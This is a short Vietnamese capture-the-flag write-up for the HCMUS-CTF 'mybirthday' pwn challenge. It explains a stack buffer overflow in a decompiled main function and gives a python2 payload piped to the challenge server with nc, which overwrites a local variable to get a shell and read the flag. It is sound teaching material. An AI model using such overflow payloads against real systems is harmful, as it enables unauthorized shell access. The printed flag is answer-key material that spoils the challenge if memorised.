## ⚡ [mybirthday](https://ctf.hcmus.edu.vn/challenges#mybirthday-5)

[![df](https://img.shields.io/badge/B3T4-shark-brightgreen.svg)](https://img.shields.io/badge/B3T4-shark-brightgreen.svg)
[![df](https://img.shields.io/badge/member-viplazy-brightgreen.svg)](https://img.shields.io/badge/member-viplazy-brightgreen.svg)
[![df](https://img.shields.io/badge/25-pts-brightgreen.svg)](https://img.shields.io/badge/25-pts-brightgreen.svg)

Tác giả: `pakkunandy`

Tags: `pwn` `bof`

### Challenge Description

Can you guess my birthday? Or you can just gimme the flag :)

nc 61.28.237.24 30200

### Summary

Đây là challenge về buffer overflow vào biến local.  

### Exploit

Hàm main:

```c
undefined4 main(void)

{
  undefined local_2c [24];
  int local_14;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  local_14 = -0x1101002;
  setup();
  puts("Tell me your birthday?");
  read(0,local_2c,0x1e); # read 30 bytes
  if (local_14 == -0x35440101) { # compare to 0xfeefeffe
    run_cmd("/bin/bash");
  }
  else {
    run_cmd("/bin/date");
  }
  return 0;
}
```

Ta thấy biến `local_2c` có kích thước 24 bytes, nhưng hàm read lại đọc 30 bytes. Vậy ta có thể đọc và ghi đè lên vùng nhớ của biến `local_14`, để biểu thức thỏa và có được shell. Sau đó chỉ việc gọi lệnh cat để đọc flag.

```bash
$ python2 -c 'print "A"*24 + "\xff\xfe\xbb\xcaAAcat flag.txt"' | nc 61.28.237.24 30200

Tell me your birthday?
HCMUS-CTF{Just_A_Warm_Up_Pwn}
```

📫 Flag: **`HCMUS-CTF{Just_A_Warm_Up_Pwn}`**

---
*[Back to table of contents](../README.md)*

